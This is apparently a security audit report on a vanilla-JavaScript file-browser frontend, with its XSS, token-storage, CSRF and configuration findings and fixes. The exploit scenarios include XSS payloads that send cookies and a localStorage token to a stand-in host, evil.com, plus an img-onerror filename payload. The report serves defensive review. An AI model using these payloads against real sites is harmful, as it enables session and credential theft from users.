# Web Manager Security Assessment
## Entanglement `/server/web` Component

**Audit Date:** 2025-12-22  
**Auditor Role:** Principal Frontend Security Engineer / Web Penetration Tester

---

## 1. Technology Stack Identified

| Aspect | Finding |
|--------|---------|
| **Framework/Library** | Vanilla JavaScript (no framework) |
| **Language** | JavaScript (ES6+) |
| **Build System** | None (static files served directly) |
| **Dependencies** | None (no `package.json`, no npm) |
| **External Resources** | Google Fonts (IBM Plex Mono) |

**Architecture Notes:**
- Single-page application with two views: Login and File Browser
- Token-based authentication stored in `localStorage`
- Direct DOM manipulation via native APIs
- No third-party dependencies or sanitization libraries

---

## 2. Findings

### 🟠 HIGH: Reflected XSS via Error Message Interpolation

* **Location:** [app.js:574](file:///Users/admin/Desktop/Entanglement/server/web/app.js#L574)
* **Vulnerability:** Error messages are interpolated directly into `innerHTML` without sanitization. If the server returns a malicious error message containing HTML/JavaScript, it will execute.

```javascript
previewContent.innerHTML = `<span class="preview-error">Preview failed: ${error.message}</span>`;
```

* **Exploit Scenario:** An attacker controlling the server response (or via MITM) could craft an error message like:
  ```
  <img src=x onerror="document.location='https://evil.com/steal?c='+document.cookie">
  ```
  
* **Remediation:** Use `textContent` for error display or sanitize with DOMPurify:
```javascript
const errorSpan = document.createElement('span');
errorSpan.className = 'preview-error';
errorSpan.textContent = `Preview failed: ${error.message}`;
previewContent.innerHTML = '';
previewContent.appendChild(errorSpan);
```

---

### 🟠 HIGH: Upload Progress Filename XSS

* **Location:** [app.js:1107-1110](file:///Users/admin/Desktop/Entanglement/server/web/app.js#L1107-L1110)
* **Vulnerability:** The filename from a user's dropped file is interpolated directly into `innerHTML`:

```javascript
el.innerHTML = `
    <div class="upload-progress-spinner"></div>
    <span class="upload-progress-text">Uploading ${filename}...</span>
`;
```

* **Exploit Scenario:** A malicious user could create a file named:
  ```
  <img src=x onerror=alert('XSS')>.txt
  ```
  When dragged onto the page, the XSS executes.

* **Remediation:** Build DOM elements programmatically:
```javascript
const spinner = document.createElement('div');
spinner.className = 'upload-progress-spinner';
const text = document.createElement('span');
text.className = 'upload-progress-text';
text.textContent = `Uploading ${filename}...`;
el.appendChild(spinner);
el.appendChild(text);
```

---

### 🟡 MEDIUM: JWT Token Stored in localStorage

* **Location:** [app.js:31](file:///Users/admin/Desktop/Entanglement/server/web/app.js#L31), [app.js:197](file:///Users/admin/Desktop/Entanglement/server/web/app.js#L197)
* **Vulnerability:** Authentication tokens are stored in `localStorage`, making them accessible to any JavaScript running on the page—including XSS payloads.

```javascript
state.token = localStorage.getItem('entanglement_token');
localStorage.setItem('entanglement_token', data.token);
```

* **Exploit Scenario:** Any XSS vulnerability (including the ones above) can exfiltrate the token:
  ```javascript
  fetch('https://evil.com/steal?token=' + localStorage.getItem('entanglement_token'));
  ```

* **Remediation:** 
  1. Use `HttpOnly`, `Secure`, `SameSite=Strict` cookies for session tokens
  2. If localStorage is required, implement token rotation and short expiry
  3. Consider using a secure token storage abstraction

---

### 🟡 MEDIUM: No CSRF Protection

* **Location:** [app.js:180-185](file:///Users/admin/Desktop/Entanglement/server/web/app.js#L180-L185) (login), [app.js:1077-1087](file:///Users/admin/Desktop/Entanglement/server/web/app.js#L1077-L1087) (upload)
* **Vulnerability:** All state-changing requests use `Bearer` token authentication without CSRF tokens. While Bearer tokens provide some protection, combined with the localStorage token storage, a successful XSS can perform any authenticated action.

* **Remediation:** 
  - Move to cookie-based auth with `SameSite=Strict`
  - OR implement double-submit cookie pattern
  - Add `Origin` header validation on the server

---

### 🟡 MEDIUM: Client-Side Authentication Bypass (UI Only)

* **Location:** [index.html:138-142](file:///Users/admin/Desktop/Entanglement/server/web/index.html#L138-L142)
* **Vulnerability:** The initial view is determined purely by checking localStorage for a token. A user can manually set a fake token to see the browser UI (though API calls will fail).

```javascript
if (localStorage.getItem('entanglement_token')) {
    document.getElementById('browser-view').hidden = false;
} else {
    document.getElementById('login-view').hidden = false;
}
```

* **Impact:** Low direct risk since all API calls validate the token server-side, but exposes UI structure and could confuse users.

* **Remediation:** Validate token with server before showing protected UI, or accept this as acceptable UX behavior with proper 401 handling.

---

### 🔵 LOW: Hardcoded Development Server URL

* **Location:** [app.js:9-11](file:///Users/admin/Desktop/Entanglement/server/web/app.js#L9-L11)
* **Vulnerability:** The fallback API URL contains a hardcoded hostname (`instability-index`):

```javascript
const API_BASE = window.location.port === '3000'
    ? `${window.location.protocol}//${window.location.hostname}:1975`
    : 'http://instability-index:1975';
```

* **Risk:** Minimal in production if port 3000 is used, but could cause confusion or expose internal network structure if misconfigured.

* **Remediation:** Remove hardcoded fallback or replace with relative URL:
```javascript
const API_BASE = window.location.port === '3000'
    ? `${window.location.protocol}//${window.location.hostname}:1975`
    : `${window.location.origin.replace(':3000', ':1975')}`;
```

---

### ✅ POSITIVE: File Names Safely Rendered

* **Location:** [app.js:354](file:///Users/admin/Desktop/Entanglement/server/web/app.js#L354)
* **Finding:** File names from the API are rendered using `textContent`, which automatically escapes HTML:

```javascript
name.textContent = entry.name;
```

This correctly prevents XSS from malicious filenames stored on the server.

---

### ✅ POSITIVE: Breadcrumb Paths Safely Rendered

* **Location:** [app.js:298](file:///Users/admin/Desktop/Entanglement/server/web/app.js#L298), [app.js:317](file:///Users/admin/Desktop/Entanglement/server/web/app.js#L317)
* **Finding:** Path components in breadcrumbs use `textContent`:

```javascript
root.textContent = state.serverName;
item.textContent = part;
```

---

### ✅ POSITIVE: Text File Preview Uses textContent

* **Location:** [app.js:563](file:///Users/admin/Desktop/Entanglement/server/web/app.js#L563)
* **Finding:** Text file content is safely rendered:

```javascript
pre.textContent = text;
```

This prevents stored XSS from malicious text files.

---

## 3. Summary Table

| Severity | Count | Key Issues |
|----------|-------|------------|
| 🔴 Critical | 0 | — |
| 🟠 High | 2 | XSS via error interpolation, filename in upload progress |
| 🟡 Medium | 3 | localStorage token, no CSRF, client-side auth check |
| 🔵 Low | 1 | Hardcoded dev URL |
| ✅ Positive | 3 | Safe rendering of filenames, paths, text previews |

---

## 4. Recommendations (Priority Order)

| Priority | Action |
|----------|--------|
| **1** | Fix `innerHTML` XSS at lines 574 and 1107 by using `textContent` or DOM APIs |
| **2** | Consider migrating to HttpOnly cookies for token storage |
| **3** | Add DOMPurify as a sanitization layer for any dynamic HTML |
| **4** | Remove hardcoded development URL |
| **5** | Add Content-Security-Policy header on server (restrict `script-src`, `style-src`) |

---

## 5. Conclusion

The Entanglement Web Manager is a lightweight, dependency-free frontend. **Two HIGH severity XSS vulnerabilities** were identified in error message display and file upload progress UI. The core file browser correctly uses `textContent` for user-supplied data, preventing stored XSS from malicious filenames.

The use of `localStorage` for token storage is a common pattern but creates risk when combined with any XSS vulnerability. Migration to HttpOnly cookies would provide defense-in-depth.

**No critical vulnerabilities** (stored XSS in main UI, auth bypass, secret exposure) were found.
